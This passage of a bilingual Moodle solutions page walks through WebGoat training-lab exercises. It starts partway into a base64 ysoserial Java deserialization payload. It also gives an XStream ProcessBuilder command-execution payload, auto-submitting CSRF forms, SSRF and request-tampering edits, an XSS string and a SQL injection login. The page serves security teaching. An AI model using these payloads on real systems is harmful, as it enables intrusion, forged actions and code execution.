1N0cmluZztMAAxwcm9wZXJ0eU5hbWVxAH4AIHhwdnIAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0_BbqyrMwMACUkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFoAFV91c2VTZXJ2aWNlc01lY2hhbmlzbUwAGV9hY2Nlc3NFeHRlcm5hbFN0eWxlc2hlZXRxAH4AIEwAC19hdXhDbGFzc2VzdAA7TGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0hhc2h0YWJsZTtbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWVxAH4AIEwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwcQB-ACd0ABNnZXRPdXRwdXRQcm9wZXJ0aWVzdAAEdGVzdHBwcHBwcHBwcHB1cgAaW0xvcmcuaGliZXJuYXRlLnR5cGUuVHlwZTt-r6uh5JVhmgIAAHhwAAAAAXEAfgAScHBzcQB-ACIAAAAA_____wB0AANhbGxwdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX-AYIVOACAAB4cAAABiXK_rq-AAAAMQAyBwAwAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkBwAEAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcABgEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk_OR3e8-AQAGPGluaXQ-AQADKClWAQAEQ29kZQoAAwAQDAAMAA0BAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAApFeGNlcHRpb25zBwAZAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAJwEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAIPGNsaW5pdD4BABBqYXZhL2xhbmcvVGhyZWFkBwAqAQAFc2xlZXABAAQoSilWDAAsAC0KACsALgEAH3lzb3NlcmlhbC9Qd25lcjIzNzU0MjU1MzE4ODA2MDABACFMeXNvc2VyaWFsL1B3bmVyMjM3NTQyNTUzMTg4MDYwMDsAIQABAAMAAQAFAAEAGgAHAAgAAQAJAAAAAgAKAAQAAQAMAA0AAQAOAAAALwABAAEAAAAFKrcAD7EAAAACABEAAAAGAAEAAAAuABIAAAAMAAEAAAAFABMAMQAAAAEAFQAWAAIAFwAAAAQAAQAYAA4AAAA_AAAAAwAAAAGxAAAAAgARAAAABgABAAAAMwASAAAAIAADAAAAAQATADEAAAAAAAEAGgAbAAEAAAABABwAHQACAAEAFQAeAAIAFwAAAAQAAQAYAA4AAABJAAAABAAAAAGxAAAAAgARAAAABgABAAAANwASAAAAKgAEAAAAAQATADEAAAAAAAEAGgAbAAEAAAABAB8AIAACAAAAAQAhACIAAwAIACkADQABAA4AAAAZAAMAAgAAAA2nAAMBTBEnEIW4AC-xAAAAAAACACMAAAACACQAJQAAAAoAAQABACYAKAAJdXEAfgAwAAAB1Mr-ur4AAAAxABsHAAIBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbwcABAEAEGphdmEvbGFuZy9PYmplY3QHAAYBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQVx5mnuPG1HGAEABjxpbml0PgEAAygpVgEABENvZGUKAAMAEAwADAANAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhAQAMSW5uZXJDbGFzc2VzBwAZAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEAA0ZvbwAhAAEAAwABAAUAAQAaAAcACAABAAkAAAACAAoAAQABAAwADQABAA4AAAAvAAEAAQAAAAUqtwAPsQAAAAIAEQAAAAYAAQAAADsAEgAAAAwAAQAAAAUAEwAUAAAAAgAVAAAAAgAWABcAAAAKAAEAAQAYABoACXB0AARQd25ycHcBAHhxAH4ABXNxAH4AAnEAfgAScQB-ACxxAH4ANHg
		</code>
	</div>
</div>

<div><br></div>
<div><br></div>

<div>
	<h4><u><b>(A9) Vulnerable Components:</b></u></h4>
	<div>
		<div><br></div>
		<h5>Vulnerable Components</h5>
		<div><br></div>
		<span class="multilang" lang="fr">
			5. Copier-coller <code>Ok&lt;script&gt;XSS&lt;/script&gt;</code> dans chaque case.
		</span>
		<span class="multilang" lang="en">
			5. Copy-paste <code>Ok&lt;script&gt;XSS&lt;/script&gt;</code> in each box.
		</span>
		<div><br></div>
		12.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/523703559/warning.png" alt="Warning" class="img-responsive atto_image_button_text-bottom" width="24" height="24"> 
		<span class="multilang" lang="fr">
		Cette leçon ne semble pas fonctionner.
		</span>
		<span class="multilang" lang="en">
		This lesson does not seem to work.
		</span>
		<div><br></div>
		<span class="multilang" lang="fr">
			Pour la désérialisation, suivre le lien http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/ 
			pour comprendre comment cela fonctionne. 
			Le <i>payload</i> suivant devrait fonctionner, mais ce n'est pas le cas.
		</span>
		<span class="multilang" lang="en">
			For the deserialization, go to the link: http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/  
			to read about why it works. 
			The following payload should work.
		</span>
		<br>
		<code>
			<br>
			&lt;sorted-set&gt;  
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp; &lt;string&gt;foo&lt;/string&gt;
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp; &lt;dynamic-proxy&gt;
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;handler class="java.beans.EventHandler"&gt;
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;target class="java.lang.ProcessBuilder"&gt;
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;command&gt;
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/command&gt;
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/target&gt;
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;action>start&lt;/action&gt;
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/handler&gt;
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp; &lt;/dynamic-proxy&gt;
			<br>
			&lt;/sorted-set&gt;
			<br>
		</code>
	</div>
</div>

<div><br></div>
<div><br></div>
<div>
	<h4><u><b>(A8:2013) Request Forgery:</b></u></h4>
	<div>
		<div><br></div>
		<h5>Cross-Site Request Forgeries</h5>
		<div><br></div>
		3.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		The form has hidden inputs. 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		You will need to use an external page and/or script to trigger it.	
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Try creating a local page or one that is uploaded and points to this form as its action.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		The trigger can be manual or scripted to happen automatically
		<div><br></div>
		<span class="multilang" lang="fr">
			Sauvegarder le code suivant dans un fichier <b>csrf.html</b> et l'ouvrir dans un navigateur.
		</span>
		<span class="multilang" lang="en">
			Save the following code in a file <b>csrf.html</b> and open it in a web browser.
		</span>
		<br>
		<code>
			<br>
			&lt;form name="attack" action="http://host:port/WebGoat/csrf/basic-get-flag" method="POST"&gt;
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp; &lt;input type="hidden" name='csrf' value='true'&gt;
			<br>
			&lt;/form&gt;
			<br>
			&lt;script&gt;document.attack.submit();&lt;/script&gt;
			<br>
		</code>
		<div><br></div>
		4.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Again, you will need to submit from an external domain/host to trigger this action. While CSRF can often be triggered from the same host (e.g. via persisted payload), this doesn't work that way.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Remember, you need to mimic the existing workflow/form.	
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		This one has a weak anti-CSRF protection, but you do need to overcome (mimic) it
		<div><br></div>
		<span class="multilang" lang="fr">
			Sauvegarder le code suivant dans un fichier <b>csrf.html</b> et l'ouvrir dans un navigateur.
		</span>
		<span class="multilang" lang="en">
			Save the following code in a file <b>csrf.html</b> and open it in a web browser.
		</span>
		<br>
		<code>
			<br>
			&lt;form name="attack" action="http://host:port/WebGoat/csrf/review" method="POST"&gt;
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp; &lt;input type="hidden" name='reviewText' value='This App Rocks'&gt;
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp; &lt;input type="hidden" name='stars' value='5'&gt;
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp; &lt;input type="hidden" name='validateReq' value='2aa14227b9a13d0bede0388a7fba9aa9'&gt;
			<br>
			&lt;/form&gt;
			<br>
			&lt;script&gt;document.attack.submit();&lt;/script&gt;
			<br>
		</code>
		<div><br></div>
		7.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Look at the content-type.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Try to post the same message with content-type text/plain	
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		The json can be put into a hidden field inside
		<div><br></div>
		<span class="multilang" lang="fr">
			Sauvegarder le code suivant dans un fichier <b>csrf.html</b> et l'ouvrir dans un navigateur.
		</span>
		<span class="multilang" lang="en">
			Save the following code in a file <b>csrf.html</b> and open it in a web browser.
		</span>
		<br>
		<code>
			<br>
			&lt;form name="attack" enctype="text/plain" action="http://host:port/WebGoat/csrf/feedback/message" method="POST"&gt;
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp; &lt;input type="hidden" name='{"name": "Test", "email": "test1233@dfssdf.de", "subject": "service", "message":"dsaffd"}'&gt;
			<br>
			&lt;/form&gt;
			<br>
			&lt;script&gt;document.attack.submit();&lt;/script&gt;
		</code>
		<div><br></div>
		8.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		First create a new account with csrf-username
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Create a form which will log you in as this user (hint 1) and upload it to WebWolf	
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Visit this assignment again
		<div><br></div>
		<span class="multilang" lang="fr">
			Suivre les instructions.
		</span>
		<span class="multilang" lang="en">
			Follow the instructions.
		</span>
	</div>
	<div>
		<div><br></div>
		<h5>Server-Side Request Forgeries</h5>
		<div><br></div>
		2.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		You should use an HTTP proxy to intercept the request and change the URL.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		If Tom is images/tom.png, Jerry would be images/jerry.png.
		<div><br></div>
		<ul>
			<li>
				<span class="multilang" lang="fr">
					Ouvrir les <i>Outils de développements</i> du navigateur, et aller dans l'onglet <i>Réseau</i>.
				</span>
				<span class="multilang" lang="en">
					Open the <i>Development Tools</i> in the browser, and go to the <i>Network</i> tab. 
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Sur WebGoat, cliquer sur <b>Steal the Cheese</b>.
				</span>
				<span class="multilang" lang="en">
					On <b>WebGoat</b> click on <b>Steal the Cheese</b>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Repérer la requête vers <code>task1</code> dans l'onglet <i>Réseau</i> et cliquer sur <i>Modifier et Renvoyer</i>.
				</span>
				<span class="multilang" lang="en">
					Locate the query to <code>task1</code> in the <i>Network</i> tab and click on <i>Edit and Resend</i>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Modifier le corps de la requête en <code>url=images/jerry.png</code>, et la renvoyer.
				</span>
				<span class="multilang" lang="en">
					Modify the body of the request with <code>url=images/jerry.png</code> and send it again.
				</span>
			</li>
		</ul>
		<div><br></div>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/60600984/ssrf-2.png" alt="SSRF 2" class="img-responsive atto_image_button_text-bottom" width="800" height="334">
		<div><br></div>
		3.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		You need to put the protocol, "http://" in front of ifconfig.pro.
		<div><br></div>
		<ul>
			<li>
				<span class="multilang" lang="fr">
					Ouvrir les <i>Outils de développements</i> du navigateur, et aller dans l'onglet <i>Réseau</i>.
				</span>
				<span class="multilang" lang="en">
					Open the <i>Development Tools</i> in the browser, and go to the <i>Network</i> tab. 
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Sur WebGoat, cliquer sur <b>Steal the Cheese</b>.
				</span>
				<span class="multilang" lang="en">
					On <b>WebGoat</b> click on <b>Steal the Cheese</b>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Repérer la requête vers <code>task2</code> dans l'onglet <i>Réseau</i> et cliquer sur <i>Modifier et Renvoyer</i>.
				</span>
				<span class="multilang" lang="en">
					Locate the query to <code>task2</code> in the <i>Network</i> tab and click on <i>Edit and Resend</i>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Modifier le corps de la requête en <code>url=http://ifconfig.pro</code>, et la renvoyer.
				</span>
				<span class="multilang" lang="en">
					Modify the body of the request with <code>url=http://ifconfig.pro</code> and send it again.
				</span>
			</li>
		</ul>
		<div><br></div>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/312252996/ssrf-3.png" alt="SSRF 3" class="img-responsive atto_image_button_text-bottom" width="800" height="333">
		<div><br></div>
	</div>
</div>

<div><br></div>
<div><br></div>

<div>
	<h4><u><b>Client side:</b></u></h4>
	<div>
		<div><br></div>
		<h5>Bypass front-end restrictions</h5>
		<div><br></div>
		2.
		<ul>
			<li>
				<span class="multilang" lang="fr">
					Ouvrir les <i>Outils de développements</i> du navigateur, et aller dans l'onglet <i>Réseau</i>.
				</span>
				<span class="multilang" lang="en">
					Open the <i>Development Tools</i> in the browser, and go to the <i>Network</i> tab. 
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Sur WebGoat, cliquer sur <b>submit</b> sans toucher aux paramètres.
				</span>
				<span class="multilang" lang="en">
					On <b>WebGoat</b> click on <b>submit</b> without editing the parameters.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Repérer la requête vers <code>FieldRestrictions</code> dans l'onglet <i>Réseau</i> et cliquer sur <i>Modifier et Renvoyer</i>.
				</span>
				<span class="multilang" lang="en">
					Locate the query to <code>FieldRestrictions</code> in the <i>Network</i> tab and click on <i>Edit and Resend</i>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Modifier le corps de la requête en <code>select=option3&amp;radio=option3&amp;checkbox=a&amp;shortInput=123456</code>, et la renvoyer.
				</span>
				<span class="multilang" lang="en">
					Modify the body of the request with <code>select=option3&amp;radio=option3&amp;checkbox=a&amp;shortInput=123456</code> and send it again.
				</span>
			</li>
		</ul>
		<div><br></div>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/47958965/bfer-1.png" alt="BFER 1" class="img-responsive atto_image_button_text-bottom" width="800" height="335">
		<div><br></div>
		3.
		<ul>
			<li>
				<span class="multilang" lang="fr">
					Ouvrir les <i>Outils de développements</i> du navigateur, et aller dans l'onglet <i>Réseau</i>.
				</span>
				<span class="multilang" lang="en">
					Open the <i>Development Tools</i> in the browser, and go to the <i>Network</i> tab. 
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Sur WebGoat, cliquer sur <b>submit</b> sans toucher aux paramètres.
				</span>
				<span class="multilang" lang="en">
					On <b>WebGoat</b> click on <b>submit</b> without editing the parameters.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Repérer la requête vers <code>frontendValidation</code> dans l'onglet <i>Réseau</i> et cliquer sur <i>Modifier et Renvoyer</i>.
				</span>
				<span class="multilang" lang="en">
					Locate the query to <code>frontendValidation</code> in the <i>Network</i> tab and click on <i>Edit and Resend</i>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Modifier le corps de la requête en <code>field1=abcz&amp;field2=123z&amp;field3=abc+123+ABC'z&amp;field4=sevenz&amp;field5=01101z&amp;field6=90210-1111z&amp;field7=301-604-4882z&amp;error=0</code>, et la renvoyer.
				</span>
				<span class="multilang" lang="en">
					Modify the body of the request with <code>field1=abcz&amp;field2=123z&amp;field3=abc+123+ABC'z&amp;field4=sevenz&amp;field5=01101z&amp;field6=90210-1111z&amp;field7=301-604-4882z&amp;error=0</code> and send it again.
				</span>
			</li>
		</ul>
		<div><br></div>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/11930731/bpfer-3.png" alt="BPFER 3" class="img-responsive atto_image_button_text-bottom" width="800" height="333">
		<div><br></div>
	</div>
	<div>
		<div><br></div>
		<h5>HTML tampering</h5>
		<div><br></div>
		2.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Try to change the number of items and see what is happening
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Is the price part of the HTML request?
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Intercept the request and manipulate the price before submitting it.
		<div><br></div>
		<ul>
			<li>
				<span class="multilang" lang="fr">
					Ouvrir les <i>Outils de développements</i> du navigateur, et aller dans l'onglet <i>Réseau</i>.
				</span>
				<span class="multilang" lang="en">
					Open the <i>Development Tools</i> in the browser, and go to the <i>Network</i> tab. 
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Sur WebGoat, cliquer sur <b>Chekout</b> sans toucher aux paramètres.
				</span>
				<span class="multilang" lang="en">
					On <b>WebGoat</b> click on <b>Chekout</b> without editing the parameters.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Repérer la requête vers <code>task</code> dans l'onglet <i>Réseau</i> et cliquer sur <i>Modifier et Renvoyer</i>.
				</span>
				<span class="multilang" lang="en">
					Locate the query to <code>task</code> in the <i>Network</i> tab and click on <i>Edit and Resend</i>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Modifier le corps de la requête en <code>QTY=2&amp;Total=0</code>, et la renvoyer.
				</span>
				<span class="multilang" lang="en">
					Modify the body of the request with <code>QTY=2&amp;Total=0</code> and send it again.
				</span>
			</li>
		</ul>
		<div><br></div>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/279075483/html-tampering-2.png" alt="HTML Tampering" class="img-responsive atto_image_button_text-bottom" width="800" height="335">
		<div><br></div>
	</div>
	<div>
		<div><br></div>
		<h5>Client side filtering</h5>
		<div><br></div>
		2.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		The information displayed when an employee is chosen from the drop down menu is stored on the client side.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Use Firebug to find where the information is stored on the client side.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Examine the hidden table to see if there is anyone listed who is not in the drop down menu.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Look in the last row of the hidden table.
		<div><br></div>
		<ul>
			<li>
				<span class="multilang" lang="fr">
					Effectuer un clic-droit sur l'élément défilant <b>Select user</b>, et cliquer sur <i>Examiner l'élément</i>.
				</span>
				<span class="multilang" lang="en">
					Right-click on the <b>Select user</b> scrolling element, and click on <i>Inspect Element</i>
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Juste en dessous dans le HTML, on trouve un tableau caché, dans lequel les informations sur Neville Bartholomew sont présentes.
				</span>
				<span class="multilang" lang="en">
					Just below in the HTML, there is a hidden table, in which information about Neville Bartholomew is present.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Son salaire est de 450000.
				</span>
				<span class="multilang" lang="en">
					Its salary is 450000.
				</span>
			</li>
		</ul>
		<div><br></div>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/64988004/client-side-filtering-2.png" alt="Client Side Filtering 2" class="img-responsive atto_image_button_text-bottom" width="800" height="336">
		<div><br></div>
		3.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Look through the web page inspect the sources etc
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Try to see the flow of request from the page to the backen
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		client.side.filtering.free.hint3
		<div><br></div>
		<ul>
			<li>
				<span class="multilang" lang="fr">
					Ouvrir les <i>Outils de développements</i> du navigateur, et aller dans l'onglet <i>Réseau</i>.
				</span>
				<span class="multilang" lang="en">
					Open the <i>Development Tools</i> in the browser, and go to the <i>Network</i> tab. 
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Sur WebGoat, cliquer sur la case <b>CHECKOUT CODE</b> sans rentrer d'informations, puis sur cliquer sur <b>Chekout</b>.
				</span>
				<span class="multilang" lang="en">
					On <b>WebGoat</b> click on the <b>CHECKOUT CODE</b> case then click on <b>Chekout</b> without editing the parameters.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Repérer la requête vers <code>coupons</code> dans l'onglet <i>Réseau</i> et cliquer sur <i>Réponse</i>.
				</span>
				<span class="multilang" lang="en">
					Locate the query to <code>coupons</code> in the <i>Network</i> tab and click on <i>Response</i>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Remarquer le code <code>get_it_for_free</code> permettant d'obtenir un <i>discount</i> de 100%.
				</span>
				<span class="multilang" lang="en">
					Notice the <code>get_it_for_free</code> code to get a discount of 100%.
				</span>
			</li>
		</ul>
	</div>
</div>

<div><br></div>
<div><br></div>

<div>
	<h4><u><b>Challenges:</b></u></h4>
	<div>
		<div><br></div>
		<h5>Admin lost password</h5>
		<div><br></div>
		<ul>
			<li>
				<span class="multilang" lang="fr">
					Télécharger l'image http://host:port/WebGoat/images/webgoat2.png .
				</span>
				<span class="multilang" lang="en">
					Download the image http://host:port/WebGoat/images/webgoat2.png .
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					L'ouvrir dans un éditeur de texte.
				</span>
				<span class="multilang" lang="en">
					Open it in a text editor.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Rechercher la chaine de caratères <b>admin</b> pour tomber sur le mot de passe <b>!!webgoat_admin_1234!!</b>.
				</span>
				<span class="multilang" lang="en">
					Look up for the string <b>admin</b> to find the password <b>!!webgoat_admin_1234!!</b>.
				</span>
			</li>
		</ul>
	</div>
	<div>
		<div><br></div>
		<h5>Without password</h5>
		<div><br></div>
		Username: <b>Larry</b> Password: <b>' or 1=1 --</b>
	</div>
	<div>
		<div><br></div>
		<h5>Creating a new account</h5>
		<div><br></div>
		<span class="multilang" lang="fr">
			Ce challenge est exactement le même que celui de <b>(A1) Injection</b> - SQL Injection (advanced) 5.
		</span>
		<span class="multilang" lang="en">
			This challenge is exactly the same as <b>(A1) Injection</b> - SQL Injection (advanced) 5.
		</span>
		
	</div>
	<div>
		<div><br></div>
		<h5>Admin password reset</h5>
		<div><br></div>
	</div>
	<div>
		<div><br></div>
		<h5>Without account</h5>
		<div><br></div>
	</div>
</div>